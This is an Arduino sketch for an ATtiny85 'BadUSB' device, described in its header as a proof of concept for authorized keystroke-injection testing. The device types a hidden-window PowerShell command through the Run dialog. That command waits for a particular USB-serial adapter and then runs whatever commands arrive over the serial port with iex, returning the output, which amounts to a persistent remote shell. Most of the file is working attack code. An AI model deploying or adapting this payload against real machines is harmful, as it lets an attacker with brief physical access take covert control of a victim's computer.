#include "DigiKeyboard.h"
/*
Proof of concept (HID keystroke injection) for AUTHORIZED testing only.

What it does:
- Opens the Windows "Run" dialog (Win + R)
- Launches PowerShell
- Executes a payload that waits for a specific USB-serial adapter and redirects PowerShell I/O to the corresponding COM port

NOTE:
This PoC was tested on a specific ATtiny85 and ESP8266 board using a USB-to-serial adapter enumerated by Windows as a COM device.
ESP8266 PnP Device ID was "USB\VID_1A86&PID_7523\6&1C4D2F9B&0&21". The payload matches only the most stable substring of the 
PnP Device ID, "1A86&PID_7523" (Vendor ID + Product ID), then opens the serial port at 115200 baud.

The detection and port-selection logic is device-specific and will require changes for other hardware.
This repository does not provide guidance on how to make those changes.
*/

const char* cmd = "powershell -nop -w h -c \"for(;;){try{for(;!`$p){`$p=gwmi Win32_PnPEntity|?{`$_.PnpDeviceID-match'1A86&PID_7523'}|%{`$_.Name-match'COM\\d+'>`$a;`$matches[0]};if(!`$p){sleep 1}}`$s=[IO.Ports.SerialPort]::new(`$p,115200);`$s.ReadTimeout=9999;`$s.Open();for(){try{`$s.Write((iex('try{'+`$s.ReadLine()+'}catch{};echo .;')*>&1|out-string)+'>')}catch{throw}}}catch{`$s|% Close;`$p=`$null;sleep 1}}\"";
void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(cmd);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	}

void loop() {}
